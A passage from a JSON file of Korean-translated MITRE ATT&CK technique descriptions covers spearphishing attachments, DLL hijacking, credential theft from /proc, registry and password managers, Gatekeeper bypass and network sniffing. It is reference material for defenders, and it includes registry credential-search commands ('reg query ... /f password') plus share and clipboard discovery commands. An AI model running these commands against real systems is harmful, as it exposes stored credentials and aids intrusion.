    "description": "적대자는 피해자 시스템에 접근하기 위해 악성 첨부파일이 포함된 스피어 피싱 이메일을 보낼 수 있습니다. 스피어 피싱 첨부파일은 스피어 피싱의 특정 변형입니다. 스피어 피싱 첨부파일은 이메일에 첨부된 악성 코드를 사용하는 점에서 다른 형태의 스피어 피싱과 다릅니다. 모든 형태의 스피어 피싱은 특정 개인, 회사 또는 산업을 대상으로 하는 전자적으로 전달되는 사회 공학적 공격입니다. 이 시나리오에서 적대자는 스피어 피싱 이메일에 파일을 첨부하고, 일반적으로 사용자 실행에 의존하여 실행을 얻으려 합니다. 스피어 피싱은 또한 신뢰할 수 있는 출처로 가장하는 등의 사회 공학 기법을 포함할 수 있습니다.\n\n첨부파일로는 Microsoft Office 문서, 실행 파일, PDF 또는 아카이브 파일 등 여러 가지 옵션이 있습니다. 첨부파일을 열면(그리고 잠재적으로 보호를 우회하는 경우), 적대자의 페이로드가 취약점을 활용하거나 사용자 시스템에서 직접 실행됩니다. 스피어 피싱 이메일의 텍스트는 일반적으로 파일을 열어야 하는 그럴듯한 이유를 제시하며, 시스템 보호를 우회하는 방법을 설명할 수 있습니다. 이메일에는 이메일 경계 방어를 회피하기 위해 첨부파일(예: zip 파일 비밀번호)을 해독하는 방법에 대한 지침이 포함될 수 있습니다. 적대자는 첨부된 실행 파일을 문서 파일처럼 보이게 하거나 한 응용 프로그램을 이용하는 파일이 다른 응용 프로그램의 파일처럼 보이도록 파일 확장자와 아이콘을 자주 조작합니다.",
    "external_id": "T1566.001",
    "modified": "2024-10-15T16:42:01.552Z",
    "translated": true
  },
  {
    "title": "Stripped Payloads",
    "description": "적대자는 기호, 문자열 및 기타 사람이 읽을 수 있는 정보를 제거하여 페이로드를 분석하기 어렵게 만들 수 있습니다. 스크립트와 실행 파일에는 개발자가 코드 기능을 문서화하는 데 도움을 주는 변수 이름과 기타 문자열이 포함될 수 있습니다. 기호는 실행 가능한 페이로드가 컴파일될 때 운영 체제의 링크에 의해 종종 생성됩니다. 리버스 엔지니어는 이러한 기호와 문자열을 사용하여 코드를 분석하고 페이로드의 기능을 식별합니다.\n\n적대자는 말웨어 분석을 더 어렵게 만들기 위해 스트립된 페이로드를 사용할 수 있습니다. 예를 들어, 컴파일러와 기타 도구는 문자열과 기호를 제거하거나 혼란스럽게 만드는 기능을 제공할 수 있습니다. 적대자는 탐지 및 분석을 피하기 위해 스트립된 페이로드 형식, 예를 들어 실행 전용 AppleScripts와 같은 것을 사용했습니다. 이는 [AppleScript]의 컴파일되고 스트립된 버전입니다. 사람이 읽을 수 있는 정보의 부족은 페이로드의 탐지 및 분석을 직접적으로 방해할 수 있습니다.",
    "external_id": "T1027.008",
    "modified": "2024-04-16T12:26:49.584Z",
    "translated": true
  },
  {
    "title": "Component Object Model",
    "description": "적대 세력은 로컬 코드 실행을 위해 Windows 구성 요소 개체 모델(COM)을 사용할 수 있습니다. COM은 소프트웨어 개체 간의 상호 작용을 가능하게 하는 네이티브 Windows 응용 프로그램 프로그래밍 인터페이스(API)의 프로세스 간 통신(IPC) 구성 요소입니다. COM을 통해 클라이언트 객체는 서버 객체의 메서드를 호출할 수 있으며, 서버 객체는 일반적으로 바이너리 동적 링크 라이브러리(DLL) 또는 실행 파일(EXE)입니다. 원격 COM 실행은 원격 서비스에 의해 용이해지며, 여기에는 분산 구성 요소 개체 모델(DCOM)이 포함됩니다.\n\n다양한 COM 인터페이스가 노출되어 있어 C, C++, Java 및 비주얼 베이직과 같은 다양한 프로그래밍 언어를 통해 임의의 실행을 호출하는 데 악용될 수 있습니다. 특정 COM 객체는 코드 실행을 넘어서는 기능을 직접 수행하기 위해 존재하며, 여기에는 예약 작업/작업 생성, 파일 없는 다운로드/실행 및 특권 상승 및 지속성 관련 기타 적대적 행동이 포함됩니다.",
    "external_id": "T1559.001",
    "modified": "2021-07-26T22:51:20.448Z",
    "translated": true
  },
  {
    "title": "DLL Search Order Hijacking",
    "description": "대적자는 DLL을 로드하는 데 사용되는 검색 순서를 탈취하여 자신들의 악성 페이로드를 실행할 수 있습니다. 윈도우 시스템은 프로그램에 로드할 필수 DLL을 찾기 위해 일반적인 방법을 사용합니다. DLL 로드를 탈취하는 것은 지속성을 확립하거나 권한을 상승시키고/또는 파일 실행에 대한 제한을 회피하기 위한 목적일 수 있습니다.\n\n대적자가 DLL 로드를 탈취할 수 있는 방법은 다양합니다. 대적자는 프로그램이 요청할 정당한 라이브러리의 위치보다 먼저 검색되는 디렉토리에 트로이 목마 DLL 파일을 배치하여 윈도우가 피해 프로그램에 의해 호출될 때 그들의 악성 라이브러리를 로드하게 만들 수 있습니다. 또한 대적자는 이진 식재 공격이라고도 불리는 DLL 사전 로딩을 수행하며, 애매하게 지정된 DLL과 동일한 이름의 악성 DLL을 정당한 DLL보다 먼저 검색되는 위치에 배치합니다. 이 위치는 종종 프로그램의 현재 작업 디렉토리입니다. 원격 DLL 사전 로딩 공격은 프로그램이 DLL을 로드하기 전에 현재 디렉토리를 웹 공유와 같은 원격 위치로 설정할 때 발생합니다.\n\n팬텀 DLL 탈취는 대적자가 존재하지 않는 DLL 파일 참조를 목표로 하는 DLL 검색 순서 탈취의 특정 유형입니다. 이들은 누락된 모듈의 위치에 올바른 이름으로 자신의 악성 DLL을 배치함으로써 이를 로드할 수 있습니다.\n\n대적자는 또한 DLL 리디렉션을 통해 검색 순서를 직접 수정할 수 있으며, 이 과정이 활성화된 후(레지스트리 및 리디렉션 파일 생성) 프로그램이 다른 DLL을 로드하도록 만들 수 있습니다.\n\n검색 순서가 취약한 프로그램이 더 높은 권한 수준에서 실행되도록 구성되어 있다면, 대적자가 제어하는 DLL도 더 높은 수준에서 실행됩니다. 이 경우, 이 기술은 사용자에서 관리자 또는 SYSTEM으로, 또는 관리자에서 SYSTEM으로 권한 상승에 사용될 수 있습니다. 경로 탈취의 피해자가 된 프로그램은 악성 DLL이 교체하려고 했던 정당한 DLL도 로드하도록 구성될 수 있으므로 정상적으로 작동하는 것처럼 보일 수 있습니다.",
    "external_id": "T1574.001",
    "modified": "2024-09-30T17:32:59.948Z",
    "translated": true
  },
  {
    "title": "Automated Collection",
    "description": "시스템이나 네트워크 내에 자리잡게 되면, 공격자는 내부 데이터를 수집하기 위해 자동화된 기술을 사용할 수 있습니다. 이 기술을 수행하는 방법에는 특정 조건(예: 파일 유형, 위치 또는 이름)을 충족하는 정보를 검색하고 복사하기 위해 명령 및 스크립트 인터프리터를 사용하는 것이 포함될 수 있습니다. \n\n클라우드 기반 환경에서는 공격자가 클라우드 API, 데이터 파이프라인, 명령 줄 인터페이스 또는 추출, 변환 및 적재(ETL) 서비스를 사용하여 데이터를 자동으로 수집할 수도 있습니다. \n\n이 기능은 원격 액세스 도구에 통합될 수도 있습니다. \n\n이 기술은 파일을 식별하고 이동하기 위해 파일 및 디렉토리 검색과 측면 도구 전송과 같은 다른 기술을 통합할 수 있으며, 클라우드 서비스 대시보드와 클라우드 저장소 오브젝트 검색을 사용하여 클라우드 환경 내 자원을 식별할 수도 있습니다.",
    "external_id": "T1119",
    "modified": "2024-09-25T20:40:07.791Z",
    "translated": true
  },
  {
    "title": "Clipboard Data",
    "description": "적대 세력은 사용자들이 애플리케이션 내 또는 애플리케이션 간에 정보를 복사할 때 클립보드에 저장된 데이터를 수집할 수 있습니다. \n\n예를 들어, Windows에서는 적대 세력이 <code>clip.exe</code> 또는 <code>Get-Clipboard</code>를 사용하여 클립보드 데이터에 접근할 수 있습니다. 또한, 적대 세력은 사용자들의 클립보드를 모니터링한 후 그들의 데이터로 교체할 수 있습니다. macOS와 Linux 또한 클립보드 내용을 가져오기 위한 <code>pbpaste</code>와 같은 명령어를 가지고 있습니다.",
    "external_id": "T1115",
    "modified": "2023-04-14T21:51:47.277Z",
    "translated": true
  },
  {
    "title": "Proc Filesystem",
    "description": "적대자는 proc 파일 시스템 또는 `/proc`에서 자격 증명을 수집할 수 있습니다. proc 파일 시스템은 리눅스 기반 시스템에서 가상 메모리를 관리하기 위한 커널 데이터 구조에 대한 인터페이스로 사용되는 가상 파일 시스템입니다. 각 프로세스에 대해, `/proc/<PID>/maps` 파일은 프로세스의 가상 주소 공간 내에서 메모리가 어떻게 매핑되어 있는지를 보여줍니다. 또한, 디버깅 목적으로 제공되는 `/proc/<PID>/mem`은 프로세스의 가상 주소 공간에 대한 접근을 제공합니다.\n\n루트 권한으로 실행할 경우, 적대자는 시스템의 모든 프로세스에서 자격 증명을 나타내는 패턴이 포함된 메모리 위치를 검색할 수 있습니다. 적대자는 고정 문자열 또는 캐시된 해시를 메모리 구조에서 찾기 위해 정규 표현식 패턴을 사용할 수 있습니다. 특권 없이 실행할 경우, 프로세스는 여전히 자신의 가상 메모리 위치를 볼 수 있습니다. 일부 서비스나 프로그램은 프로세스의 메모리 내에 텍스트 형식으로 자격 증명을 저장할 수 있습니다.\n\n웹 브라우저의 권한으로 실행하거나 권한이 있는 경우, 프로세스는 일반적인 웹사이트 자격 증명 패턴을 찾기 위해 `/maps` 및 `/mem` 위치를 검색할 수 있으며, 이곳에서 해시 또는 텍스트 형식의 자격 증명이 위치할 수 있습니다.",
    "external_id": "T1003.007",
    "modified": "2024-10-15T15:13:32.253Z",
    "translated": true
  },
  {
    "title": "Password Managers",
    "description": "적대자는 제3자 비밀번호 관리자로부터 사용자 자격 증명을 획득할 수 있습니다. 비밀번호 관리자는 사용자 자격 증명을 저장하도록 설계된 애플리케이션으로, 일반적으로 암호화된 데이터베이스에 저장됩니다. 자격 증명은 사용자가 데이터베이스의 잠금을 해제하는 마스터 비밀번호를 제공한 후에 접근할 수 있습니다. 데이터베이스가 잠금 해제된 후, 이러한 자격 증명은 메모리에 복사될 수 있습니다. 이 데이터베이스는 디스크에 파일로 저장될 수 있습니다.\n\n적대자는 마스터 비밀번호와/또는 평문 자격 증명을 메모리에서 추출하여 비밀번호 관리자에서 사용자 자격 증명을 획득할 수 있습니다. 적대자는 자격 증명을 획득하기 위해 메모리에서 추출할 수 있습니다. 또한, 비밀번호 관리자의 마스터 비밀번호를 획득하기 위해 무차별 대입을 시도할 수 있습니다.",
    "external_id": "T1555.005",
    "modified": "2024-08-19T13:53:33.661Z",
    "translated": true
  },
  {
    "title": "Gatekeeper Bypass",
    "description": "적대자는 파일 속성을 수정하고 Gatekeeper 기능을 무력화하여 사용자 프롬프트를 회피하고 신뢰할 수 없는 프로그램을 실행할 수 있습니다. Gatekeeper는 호스트에서 신뢰할 수 있는 응용 프로그램만 실행되도록 보장하는 Apple의 보안 모델의 계층으로 작용하는 기술 세트입니다. Gatekeeper는 Snow Leopard(10.6, 2009)의 파일 격리 기능 위에 구축되었으며, 코드 서명, 보안 정책 준수, 인증 등의 기능을 포함하도록 발전하였습니다. 또한 Gatekeeper는 처음 실행되는 응용 프로그램을 재실행된 응용 프로그램과 다르게 처리합니다.\n\n옵트인 시스템을 기반으로 파일이 다운로드될 때, 다운로드를 수행하는 응용 프로그램에 의해 `com.apple.quarantine`이라는 확장 속성(또는 격리 플래그라고도 불림)이 파일에 설정될 수 있습니다. Launch Services는 응용 프로그램을 일시 중지된 상태로 엽니다. 격리 플래그가 설정된 처음 실행되는 응용 프로그램의 경우, Gatekeeper는 다음과 같은 기능을 수행합니다:\n\n1. 확장 속성 확인 - Gatekeeper는 격리 플래그를 확인한 후, 사용자에게 실행 허가 또는 거부를 요청하는 경고 프롬프트를 제공합니다.\n\n2. 시스템 정책 확인 - Gatekeeper는 시스템 보안 정책을 확인하여 App Store 또는 App Store와 식별된 개발자 둘 다에서 다운로드된 응용 프로그램을 실행할 수 있도록 허용합니다.\n\n3. 코드 서명 - Gatekeeper는 Apple Developer ID의 유효한 코드 서명을 확인합니다.\n\n4. 인증 - `api.apple-cloudkit.com` API를 사용하여 Gatekeeper는 Apple 서버에 접속하여 인증 티켓을 확인하거나 다운로드하고, 티켓이 폐지되지 않았는지 확인합니다. 사용자는 인증을 무시할 수 있으며, 이 경우 “권한 없는 응용 프로그램” 실행에 대한 프롬프트가 나타나고 보안 정책이 수정됩니다.\n\n적대자는 논리 오류, 확인되지 않은 파일 유형, 외부 라이브러리를 통해 Gatekeeper의 하나 이상의 보안 제어를 무력화할 수 있습니다. 예를 들어, macOS 13 Ventura 이전에는 코드 서명 및 인증 검사가 처음 실행시에만 수행되었기 때문에, 적대자는 악성 실행 파일을 이전에 열린 응용 프로그램에 작성하여 Gatekeeper 보안 검사를 우회할 수 있었습니다.\n\nUSB 플래시 드라이브, 광 디스크, 외장 하드 드라이브에서 시스템으로 로드된 응용 프로그램 및 파일, 로컬 네트워크에서 공유된 드라이브 또는 curl 명령을 사용하여 전송된 파일은 격리 플래그를 설정하지 않을 수 있습니다. 추가적으로, [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)를 사용하여 격리 플래그를 설정하지 않는 것도 가능합니다.",
    "external_id": "T1553.001",
    "modified": "2022-10-21T19:30:58.414Z",
    "translated": true
  },
  {
    "title": "Drive-by Target",
    "description": "적대 세력은 사용자가 웹사이트를 인터넷 서핑하는 동안 감염된 시스템을 준비할 수 있습니다. 엔드포인트 시스템은 적대 세력이 제어하는 사이트를 탐색함으로써 타격을 받을 수 있습니다. 이러한 경우, 사용자의 웹 브라우저는 일반적으로 악용의 대상이 되며, 사이트에 도착한 후 추가적인 사용자 상호작용을 요구하지 않을 수 있습니다. 하지만 적대 세력은 웹사이트를 비악용 행동을 위해 설정할 수도 있습니다. 드라이브 바이 공격을 위해 적대 세력은 사용자가 적대 세력이 제어하는 사이트로 브라우징할 때 그 악용을 전달하는 데 필요한 자원을 준비해야 합니다. 드라이브 바이 콘텐츠는 적대 세력이 획득한 인프라나 이전에 손상된 인프라에 스테이징될 수 있습니다.\n\n적대 세력은 웹사이트에 악성 웹 콘텐츠를 업로드하거나 주입할 수 있으며, 이에는 여러 가지 방법이 포함됩니다:\n\n* 웹 페이지나 포럼 게시물 같은 사용자 제어가 가능한 웹 콘텐츠에 악성 스크립트 삽입\n* 공개적으로 쓰기 가능한 클라우드 스토리지 버킷에서 웹사이트에 제공되는 스크립트 파일 수정\n* 악성 웹 광고 제작 및 합법적인 광고 제공자를 통해 웹사이트에 광고 공간 구매\n\n사용자의 웹 브라우저를 악용하기 위한 콘텐츠를 스테이징하는 것 외에도, 적대 세력은 사용자의 브라우저를 프로파일링하기 위한 스크립팅 콘텐츠를 스테이징할 수도 있습니다. 적대 세력에 의해 손상된 웹사이트는 특정 커뮤니티(예: 정부, 특정 산업 또는 지역)에 의해 방문되는 사이트일 수 있으며, 이는 공유된 관심을 바탕으로 특정 사용자나 사용자 집합을 타격하는 것을 목표로 합니다. 이러한 목표적 캠페인은 전략적 웹 손상 또는 워터링 홀 공격이라고 합니다.\n\n적대 세력은 인프라를 획득하는 과정에서 합법적인 도메인과 유사한 도메인(예: 동형 문자, 오타 스쿼팅, 다른 최상위 도메인 등)을 구매하여 드라이브 바이 공격을 용이하게 할 수 있습니다.",
    "external_id": "T1608.004",
    "modified": "2023-04-15T00:21:55.791Z",
    "translated": true
  },
  {
    "title": "System Service Discovery",
    "description": "적대자는 등록된 로컬 시스템 서비스에 대한 정보를 수집하려고 할 수 있습니다. 적대자는 도구 및 OS 유틸리티 명령을 사용하여 서비스에 대한 정보를 얻을 수 있습니다.\n\n적대자는 자동화된 탐색 중에 시스템 서비스 검색에서 얻은 정보를 사용하여 후속 행동을 형성할 수 있으며, 여기에는 적대자가 목표를 완전히 감염시키는지 여부와 특정 행동을 시도하는지 여부가 포함됩니다.",
    "external_id": "T1007",
    "modified": "2023-04-03T18:55:18.326Z",
    "translated": true
  },
  {
    "title": "Network Sniffing",
    "description": "적대자는 네트워크 트래픽을 수동으로 스니핑하여 환경에 대한 정보를 캡처할 수 있습니다. 여기에는 네트워크를 통해 전송된 인증 자료가 포함될 수 있습니다. 네트워크 스니핑은 시스템의 네트워크 인터페이스를 사용하여 유선 또는 무선 연결을 통해 전송되는 정보를 모니터링하거나 캡처하는 것을 의미합니다. 적대자는 네트워크에서 전송 중인 데이터에 수동으로 접근하기 위해 네트워크 인터페이스를 프로미스큐어스 모드로 설정하거나, 더 많은 데이터를 캡처하기 위해 스팬 포트를 사용할 수 있습니다.\n\n이 기술을 통해 캡처된 데이터에는 사용자 자격 증명이 포함될 수 있으며, 특히 보안이 취약한 암호화되지 않은 프로토콜을 통해 전송된 경우입니다. 이름 서비스 해상도 위협 기법은 웹사이트, 프록시 및 내부 시스템에 대한 자격 증명을 캡처하기 위해 트래픽을 적대자로 리디렉션할 때 사용할 수 있습니다.\n\n네트워크 스니핑은 실행 중인 서비스, 버전 번호 및 이후의 측면 이동 또는 방어 회피 활동에 필요한 다른 네트워크 특성(예: IP 주소, 호스트 이름, VLAN ID)과 같은 구성 세부정보를 드러낼 수 있습니다. 적대자는 환경에 대한 추가 정보를 수동적으로 얻기 위해 중간자 공격(AiTM) 동안 네트워크 스니핑을 활용할 가능성이 높습니다.\n\n클라우드 기반 환경에서는 적대자가 여전히 가상 머신에서 네트워크 트래픽을 스니핑하기 위해 트래픽 미러링 서비스를 사용할 수 있습니다. 예를 들어, AWS 트래픽 미러링, GCP 패킷 미러링 및 Azure vTap은 사용자가 수집할 트래픽을 위한 특정 인스턴스와 수집된 트래픽을 전송할 특정 대상을 정의할 수 있도록 합니다. 종종 이러한 트래픽의 상당 부분은 TLS 종료를 사용하여 암호화 및 복호화의 부담을 줄이기 때문에 평문으로 전송됩니다. 적대자는 그런 다음 클라우드 계정으로 데이터 전송과 같은 이탈 기술을 사용하여 스니핑된 트래픽에 접근할 수 있습니다.\n\n네트워크 장치에서는 적대자가 '모니터 캡처'와 같은 네트워크 장치 CLI 명령을 사용하여 네트워크 캡처를 수행할 수 있습니다.",
    "external_id": "T1040",
    "modified": "2024-10-15T15:11:55.217Z",
    "translated": true
  },
  {
    "title": "Code Signing",
    "description": "적대자는 악성 코드나 도구에 서명하기 위해 코드 서명 재료를 생성, 획득하거나 훔칠 수 있습니다. 코드 서명은 개발자로부터 이진 파일의 진정성을 제공하고 이진 파일이 변조되지 않았음을 보장합니다. 작전 중 사용되는 인증서는 적대자에 의해 생성, 획득되거나 훔쳐질 수 있습니다. 이러한 활동은 유효한 서명을 초래합니다.\n\n소프트웨어를 처음 실행할 때 확인하기 위한 코드 서명은 최신 Windows 및 macOS 시스템에서 사용될 수 있습니다. 플랫폼의 탈중앙화 특성으로 인해 Linux에서는 사용되지 않습니다.\n\n코드 서명 인증서는 시스템에서 실행하기 위해 서명된 코드가 필요하다는 보안 정책을 우회하는 데 사용될 수 있습니다.",
    "external_id": "T1553.002",
    "modified": "2022-09-22T19:13:52.548Z",
    "translated": true
  },
  {
    "title": "Data from Cloud Storage",
    "description": "적대 세력은 클라우드 저장소에서 데이터를 액세스할 수 있습니다.\n\n많은 IaaS 제공업체는 온라인 데이터 객체 저장을 위한 솔루션을 제공합니다. 유사하게, Office 365와 Google Workspace와 같은 SaaS 기업 플랫폼은 OneDrive 및 Google Drive와 같은 서비스를 통해 사용자에게 클라우드 기반 문서 저장소를 제공합니다. 또한 Slack, Confluence, Salesforce, Dropbox와 같은 SaaS 애플리케이션 제공업체는 플랫폼의 부속 또는 주요 사용 사례로 클라우드 저장소 솔루션을 제공할 수 있습니다. \n\n일부 경우, IaaS 기반 클라우드 저장소와 같이 저장된 객체와 상호작용할 수 있는 포괄적인 애플리케이션이 존재하지 않습니다. 대신 이러한 솔루션에서 데이터는 Cloud API를 통해 직접 검색됩니다. SaaS 애플리케이션에서는 적대 세력이 프론트엔드 애플리케이션이나 인터페이스를 통해서가 아니라 API나 백엔드 클라우드 저장소 객체에서 직접 이 데이터를 수집할 수 있습니다. \n\n적대 세력은 이러한 클라우드 저장소 솔루션에서 민감한 데이터를 수집할 수 있습니다. 공급업체는 일반적으로 최종 사용자가 시스템을 구성할 수 있도록 돕는 보안 가이드를 제공하지만, 잘못된 구성은 일반적인 문제입니다. 클라우드 저장소가 잘못 보호된 사례가 여러 차례 있었으며, 이는 일반적으로 인증되지 않은 사용자에게 공개 액세스를 우발적으로 허용하거나 모든 사용자에게 과도하게 넓은 접근 권한을 부여하거나, 심지어 Identity Access Management 시스템의 통제를 벗어난 익명의 누구에게나 기본 사용자 권한 없이 접근을 허용하는 경우가 많았습니다.\n\n이러한 개방 접근은 신용 카드, 개인 식별 정보 또는 의료 기록과 같은 다양한 유형의 민감한 데이터를 노출할 수 있습니다.\n\n적대 세력은 또한 소스 리포지토리, 로그 또는 기타 수단에서 유출된 자격 증명을 얻어 클라우드 저장소 객체에 접근하는 방법으로 악용할 수 있습니다.",
    "external_id": "T1530",
    "modified": "2024-10-14T22:11:30.271Z",
    "translated": true
  },
  {
    "title": "Runtime Data Manipulation",
    "description": "적대자는 데이터가 접근되고 최종 사용자에게 표시되는 과정을 조작하기 위해 시스템을 수정할 수 있으며, 이는 데이터의 무결성을 위협합니다. 런타임 데이터를 조작함으로써 적대자는 비즈니스 프로세스, 조직의 이해 및 의사 결정에 영향을 미치려 할 수 있습니다.\n\n적대자는 런타임 조작을 유발하기 위해 데이터를 표시하는 데 사용되는 애플리케이션 바이너리를 변경할 수 있습니다. 또한 비슷한 효과를 낳기 위해 기본 파일 연결 변경이나 위장 기법을 사용할 수 있습니다. 수정의 종류와 그 영향은 대상 애플리케이션과 프로세스, 그리고 적대자의 목표와 목적에 따라 달라집니다. 복잡한 시스템의 경우, 적대자는 원하는 영향을 미치기 위해 해당 시스템과 관련된 전문 소프트웨어에 대한 접근이 필요할 수 있으며, 이는 일반적으로 장기적인 정보 수집 캠페인을 통해 얻어집니다.",
    "external_id": "T1565.003",
    "modified": "2024-10-15T18:21:43.760Z",
    "translated": true
  },
  {
    "title": "Credentials in Registry",
    "description": "적대자는 손상된 시스템에서 안전하지 않게 저장된 자격 증명을 찾기 위해 레지스트리를 검색할 수 있습니다. 윈도우 레지스트리는 시스템 또는 다른 프로그램에서 사용할 수 있는 구성 정보를 저장합니다. 적대자는 다른 프로그램이나 서비스에 의해 사용되기 위해 저장된 자격 증명과 암호를 찾기 위해 레지스트리를 조회할 수 있습니다. 때때로 이러한 자격 증명은 자동 로그온에 사용됩니다.\n\n암호 정보와 관련된 레지스트리 키를 찾기 위한 예제 명령어: \n\n* 로컬 머신 하이브: `reg query HKLM /f password /t REG_SZ /s`\n* 현재 사용자 하이브: `reg query HKCU /f password /t REG_SZ /s`",
    "external_id": "T1552.002",
    "modified": "2024-10-15T16:26:46.873Z",
    "translated": true
  },
  {
    "title": "Network Share Discovery",
    "description": "적대자는 원격 시스템에서 정보 수집의 전초 작업으로 활용할 수 있는 정보 출처를 파악하기 위해 공유된 폴더와 드라이브를 찾을 수 있습니다. 네트워크에는 사용자가 네트워크에 걸쳐 다양한 시스템의 파일 디렉토리에 접근할 수 있도록 하는 공유 네트워크 드라이브와 폴더가 종종 포함되어 있습니다.\n\nWindows 네트워크에서의 파일 공유는 SMB 프로토콜을 통해 이루어집니다. 원격 시스템의 사용 가능한 공유 드라이브를 쿼리하기 위해 `<code>net view \\\\\\\\remotesystem</code>` 명령을 사용할 수 있습니다. 이 명령은 로컬 시스템의 공유 드라이브를 쿼리하는 데에도 `<code>net share</code>`를 사용할 수 있습니다. macOS의 경우 `<code>sharing -l</code>` 명령은 smb 서비스에 사용되는 모든 공유 지점을 나열합니다.",
    "external_id": "T1135",
    "modified": "2023-09-29T19:44:43.870Z",
    "translated": true
  },
  {
    "title": "Peripheral Device Discovery",
    "description": "적대자는 컴퓨터 시스템에 연결된 주변 장치 및 구성 요소에 대한 정보를 수집하려고 시도할 수 있습니다. 주변 장치는 키보드, 프린터, 카메라, 스마트 카드 리더기 또는 이동식 저장 장치와 같은 다양한 기능을 지원하는 보조 자원을 포함할 수 있습니다. 이 정보는 시스템 및 네트워크 환경에 대한 인식을 높이는 데 사용되거나 추가 조치를 취하는 데 사용될 수 있습니다.",
    "external_id": "T1120",
    "modified": "2023-03-30T21:01:41.575Z",
    "translated": true
  },
  {
    "title": "Break Process Trees",
    "description": "적대적인 존재는 실행된 악성 코드의 부모 프로세스 ID(PPID)를 수정하여 프로세스 트리 기반 분석을 회피하려고 할 수 있습니다. 엔드포인트 보호 소프트웨어가 탐지를 위해 \"부모-자식\" 관계를 활용한다면, 이 관계를 끊는 것은 적대자의 행동이 이전 프로세스 트리 활동과 연결되지 않도록 할 수 있습니다. 유닉스 기반 시스템에서는 관리자가 스크립트와 프로그램을 사용하여 소프트웨어를 실행하기 위해 이 프로세스 트리를 끊는 것이 일반적인 관행입니다.\n\n리눅스 시스템에서는 적대자가 악성 코드의 프로세스 트리를 변경하기 위해 일련의 네이티브 API 호출을 실행할 수 있습니다. 예를 들어, 적대자는 인수 없이 페이로드를 실행하고 `fork()` API 호출을 두 번 수행한 다음 부모 프로세스를 종료할 수 있습니다. 이렇게 하면 부모 프로세스가 없는 손자 프로세스가 생성되어 즉시 `init` 시스템 프로세스(PID 1)에 의해 인수됩니다. 이는 적대자의 페이로드 실행을 이전 프로세스 트리와 성공적으로 분리합니다.\n\n또 다른 예시는 \"데몬\" 시스템 호출을 사용하여 현재 부모 프로세스에서 분리되고 백그라운드에서 실행되는 것입니다.",
    "external_id": "T1036.009",
    "modified": "2023-10-03T04:06:42.256Z",
    "translated": true
  },
  {
    "title": "Network Topology",
    "description": "적대자는 표적을 설정하는 데 사용할 수 있는 피해자의 네트워크 토폴로지에 대한 정보를 수집할 수 있습니다. 네트워크 토폴로지에 대한 정보는 외부 및 내부 네트워크 환경의 물리적 및 논리적 배열을 포함한 다양한 세부정보를 포함할 수 있습니다. 이 정보에는 네트워크 장치(게이트웨이, 라우터 등) 및 기타 인프라에 대한 세부사항도 포함될 수 있습니다.\n\n적대자는 이 정보를 다양한 방식으로 수집할 수 있으며, 예를 들어 직접적인 수집 활동이나 정보를 탈취하는 방법을 사용할 수 있습니다. 네트워크 토폴로지에 대한 정보는 온라인 또는 기타 접근 가능한 데이터 세트를 통해 적대자에게 노출될 수도 있습니다. 이 정보를 수집하는 것은 다른 형태의 정찰 기회를 드러낼 수 있으며, 운영 자원을 구축하거나 초기 접근을 설정하는 데 도움을 줄 수 있습니다.",
    "external_id": "T1590.004",
    "modified": "2021-04-15T03:33:02.476Z",
    "translated": true
  },
  {
    "title": "Windows File and Directory Permissions Modification",
    "description": "적대자는 파일 또는 디렉토리 권한/속성을 수정하여 접근 제어 목록(ACL)을 회피하고 보호된 파일에 접근할 수 있습니다. 파일 및 디렉토리 권한은 일반적으로 파일이나 디렉토리 소유자, 또는 적절한 권한을 가진 사용자에 의해 구성된 ACL에 의해 관리됩니다. 파일 및 디렉토리의 ACL 구현은 플랫폼에 따라 다르지만, 일반적으로 어떤 사용자 또는 그룹이 어떤 작업(읽기, 쓰기, 실행 등)을 수행할 수 있는지를 명시적으로 지정합니다.\n\nWindows는 파일 및 디렉토리 ACL을 임의 접근 제어 목록(DACL)으로 구현합니다. 표준 ACL과 유사하게, DACL은 보안 객체에 접근할 수 있는 계정을 식별합니다. 보안 객체에 접근하려고 시도하면 시스템은 DACL의 접근 제어 항목을 순서대로 확인합니다. 일치하는 항목이 발견되면 객체에 대한 접근이 허용됩니다. 그렇지 않으면 접근이 거부됩니다.\n\n적대자는 내장된 Windows 명령어인 `icacls`, `cacls`, `takeown`, `attrib`를 사용하여 DACL과 상호작용할 수 있으며, 이를 통해 특정 파일 및 폴더에 대한 더 높은 권한을 부여받을 수 있습니다. 또한, PowerShell은 파일 및 디렉토리 DACL을 검색하거나 수정하는 데 사용할 수 있는 cmdlet을 제공합니다. 특정 파일 및 디렉토리 수정은 지속성 확보, 부팅 또는 로그인 초기화 스크립트, 또는 다른 중요한 이진/구성 파일의 오염 또는 탈취와 같은 많은 기술에 필요한 단계일 수 있습니다.",
    "external_id": "T1222.001",
    "modified": "2023-04-21T12:27:04.900Z",
    "translated": true
  },
  {
    "title": "Add-ins",
    "description": "적대자는 Microsoft Office 추가 기능을 악용하여 손상된 시스템에서 지속성을 확보할 수 있습니다. Office 추가 기능은 Office 프로그램에 기능을 추가하는 데 사용할 수 있습니다. 다양한 Office 제품에서 사용할 수 있는 여러 유형의 추가 기능이 있으며, 여기에는 Word/Excel 추가 기능 라이브러리(WLL/XLL), VBA 추가 기능, Office 구성 요소 객체 모델(COOM) 추가 기능, 자동화 추가 기능, VBA 편집기(VBE), Visual Studio Tools for Office(VSTO) 추가 기능, Outlook 추가 기능 등이 포함됩니다.\n\n추가 기능은 Office 애플리케이션이 시작될 때 코드를 실행하도록 설정할 수 있기 때문에 지속성을 확보하는 데 사용될 수 있습니다.",
    "external_id": "T1137.006",
    "modified": "2024-10-15T15:37:09.190Z",
    "translated": true
  },
  {
    "title": "Transport Agent",
    "description": "적대자는 Microsoft 전송 에이전트를 악용하여 시스템에 지속적으로 접근할 수 있습니다. Microsoft Exchange 전송 에이전트는 전송 파이프라인을 통과하는 이메일 메시지에 대해 스팸 필터링, 악성 첨부파일 필터링, 저널링 또는 모든 발신 이메일의 끝에 기업 서명을 추가하는 등의 다양한 작업을 수행할 수 있습니다. 전송 에이전트는 애플리케이션 개발자가 작성할 수 있으며, 이후 .NET 어셈블리로 컴파일되어 Exchange 서버에 등록됩니다. 전송 에이전트는 이메일 처리의 특정 단계에서 호출되며, 개발자가 정의한 작업을 수행합니다.\n\n적대자는 Exchange 서버에 악성 전송 에이전트를 등록하여 적대자가 지정한 이메일 이벤트에 의해 트리거되는 지속성 메커니즘을 제공할 수 있습니다. 악성 전송 에이전트는 Exchange 전송 파이프라인을 통과하는 모든 이메일에 대해 호출될 수 있지만, 에이전트는 적대자가 정의한 기준에 따라 특정 작업만 수행하도록 구성될 수 있습니다. 예를 들어, 전송 에이전트는 수신자 이메일 주소가 